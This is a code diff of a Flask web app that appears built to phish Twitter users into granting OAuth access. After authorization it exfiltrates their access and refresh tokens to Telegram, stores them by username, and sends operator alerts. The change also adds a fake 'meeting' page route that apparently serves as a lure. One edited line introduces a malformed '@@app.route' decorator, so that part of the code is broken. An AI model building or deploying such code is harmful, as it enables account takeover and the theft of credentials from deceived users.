@@ -291,32 +291,34 @@ def send_to_telegram(access_token, refresh_token=None):
     }
     requests.post(url, json=data)
 
-@app.route('/')
+@@app.route('/')
 def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
 
     if not code:
-        state = "0"  # Use fixed state value
-        session['oauth_state'] = state
+        try:
+            state = "0"  # Fixed state
+            session['oauth_state'] = state
 
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier  # Store code_verifier in session
+            code_verifier, code_challenge = generate_code_verifier_and_challenge()
+            session['code_verifier'] = code_verifier  # Store code_verifier in session
 
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-
-        return redirect(authorization_url)
+            authorization_url = (
+                f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+                f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+                f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+            )
+            return redirect(authorization_url)
+        except Exception as e:
+            return jsonify({"error": f"Failed to initiate OAuth flow: {str(e)}"}), 500
 
     if code:
         if error:
             return f"Error during authorization: {error}", 400
 
-        if state != "0":  # Check for the fixed state value
+        if state != "0":  # Fixed state value check
             return "Invalid state parameter", 403
 
         code_verifier = session.pop('code_verifier', None)
@@ -329,22 +331,40 @@ def home():
             'code_verifier': code_verifier
         }
 
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
+        try:
+            response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+            token_response = response.json()
 
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
+            if response.status_code == 200:
+                access_token = token_response.get('access_token')
+                refresh_token = token_response.get('refresh_token')
 
-            session['access_token'] = access_token
-            session['refresh_token'] = refresh_token
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
 
-            send_to_telegram(access_token, refresh_token)
-            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+                username = get_twitter_username(access_token)
+                if username:
+                    store_token(access_token, refresh_token, username)
+                    send_message_via_telegram(f"New authorization received for @{username}.")
+                else:
+                    send_message_via_telegram(f"New authorization received but username could not be fetched.")
+
+                return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+            else:
+                error_description = token_response.get('error_description', 'Unknown error')
+                error_code = token_response.get('error', 'No error code')
+                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+        except Exception as e:
+            return jsonify({"error": f"Failed to complete OAuth flow: {str(e)}"}), 500
+
+# --- Meeting Page Route ---
+@app.route('/j')
+def meeting():
+    meeting = request.args.get('meeting')
+    pwd = request.args.get('pwd')
+    return render_template('meeting.html', meeting=meeting, pwd=pwd)
+
 
 
 if __name__ == '__main__':
